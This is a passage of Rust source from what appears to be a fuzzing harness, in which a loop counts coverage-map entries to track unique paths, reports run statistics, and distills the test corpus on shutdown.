        let cov_snapshot: &[u8; MAP_SIZE] = unsafe { &*std::ptr::addr_of!(COVERAGE_MAP) };
        let paths = cov_snapshot.iter().filter(|&&b| b > 0).count();
        if paths > unique_paths {
            unique_paths = paths;
        }
    }

    let elapsed_ms = run_start.elapsed().as_millis() as u64;
    emit_stats(&args.target, args.iterations, state.corpus().count(), elapsed_ms, unique_paths);

    // Distill corpus on shutdown and emit event.
    let (before, after) = corpus_manager.distill();
    corpus_manager.emit_distillation_event(before, after);
}
